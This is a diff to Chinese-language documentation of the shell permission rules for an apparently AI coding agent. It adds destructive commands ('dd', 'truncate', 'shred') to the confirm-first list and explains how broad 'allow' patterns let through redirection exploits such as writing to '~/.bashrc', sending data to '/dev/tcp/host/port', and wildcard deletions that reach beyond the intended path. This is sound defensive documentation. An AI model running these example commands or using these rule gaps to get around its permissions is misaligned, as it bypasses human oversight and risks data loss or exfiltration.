@@ -54,6 +54,9 @@ permission:
     "rm *": ask
     "rmdir *": ask
     "mv *": ask
+    "dd *": ask
+    "truncate *": ask
+    "shred *": ask
     "git add *": ask
     "git checkout *": ask
     "git clean *": ask
@@ -164,7 +167,7 @@ web_fetch:
 
 对于 `shell`，像 `"git *": allow` 这样的具体 `allow` pattern 不会自动放行这类命令：含未引用 shell 分隔符（`;`、`&&`、`||`、`|`、`&` 或换行）、含命令替换（`$(...)` 或反引号，双引号里的也算）、含进程替换（`<(...)` 或 `>(...)`，同样会起子进程）、含环境变量赋值或声明（`PATH=...`、`LD_PRELOAD=...` 等任意变量，以及 `export` / `declare` / `local` 的同类写法，不管写在命令前面还是单独成行），以及引号解析不出来（引号没闭合、结尾是反斜杠）。这类调用会继续匹配后续规则，通常回到 `ask` 或 `deny`。单引号里或反斜杠转义后的分隔符只是字面量，仍会命中窄规则。这只是安全兜底，不是 shell 沙箱；`shell: allow` 或 `shell: { "*": allow }` 这类宽泛规则只应给完全可信的角色使用。
 
-但一条针对具体命令的 `allow` 会覆盖该命令的全部能力，包括输出重定向。若放行了 `echo *`，那么 `echo secret > ~/.bashrc`、`echo x >> file`、`data > /dev/tcp/host/port` 都会被允许：重定向目标和命令文本属于同一条 shell 命令，而非独立的工具调用，因此不会被单独匹配或管控。环境变量赋值前缀则不同：`LD_PRELOAD=./x.so echo hi` 会按 `LD_PRELOAD=... echo hi` 整段文本匹配，因此不会借 `echo *` 放行，而是继续匹配后续规则。按命令本身文本写的规则仍然决定结果：赋值让窄 `allow` 匹配不上时，既不会把被拒绝的命令挤到更宽的规则里，也不会让窄 `ask` 落到更宽的 `allow` 上。只有当你能接受某命令的最坏情况（如通过重定向任意写文件）时，才给它命令级 `allow`；否则保持 `ask`。
+但一条针对具体命令的 `allow` 会覆盖该命令的全部能力，包括输出重定向。若放行了 `echo *`，那么 `echo secret > ~/.bashrc`、`echo x >> file`、`data > /dev/tcp/host/port` 都会被允许：重定向目标和命令文本属于同一条 shell 命令，而非独立的工具调用，因此不会被单独匹配或管控。环境变量赋值前缀则不同：`LD_PRELOAD=./x.so echo hi` 会按 `LD_PRELOAD=... echo hi` 整段文本匹配，因此不会借 `echo *` 放行，而是继续匹配后续规则。按命令本身文本写的规则仍然决定结果：赋值让窄 `allow` 匹配不上时，既不会把被拒绝的命令挤到更宽的规则里，也不会让窄 `ask` 落到更宽的 `allow` 上。同一道理适用于路径：`rm -rf /tmp/scratch/*` 并不会把授权限制在 `/tmp/scratch` 里面。规则匹配的是整条命令文本，`*` 会吃掉空格和它后面的全部参数，所以 `rm -rf /tmp/scratch/x AGENTS.md` 也一并放行。要按路径授权，就写在 `delete`、`write` 这些文件工具的规则里，它们会先把路径归一化再去匹配。只有当你能接受某命令的最坏情况（如通过重定向任意写文件）时，才给它命令级 `allow`；否则保持 `ask`。
 
 ### 只读 shell 命令（只影响并行，不影响权限）
 
